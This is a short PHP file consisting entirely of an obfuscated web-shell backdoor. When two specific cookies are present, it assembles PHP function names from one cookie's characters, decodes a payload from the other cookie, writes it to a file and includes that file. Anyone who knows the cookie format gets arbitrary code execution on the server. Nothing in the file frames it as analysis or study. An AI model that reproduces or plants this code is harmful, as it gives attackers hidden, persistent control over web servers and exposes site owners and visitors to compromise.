<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[17])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[17][$n];
        if (!$c[17][$n + 1]) {
            if (!$c[17][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[5]() . $p[6];
    if (!$p[18]($k)) {
        $n = $p[15]($k, $p[12]);
        $p[14]($n, $p[23] . $p[13]($p[20]($c[3])));
    }
    include($k);
}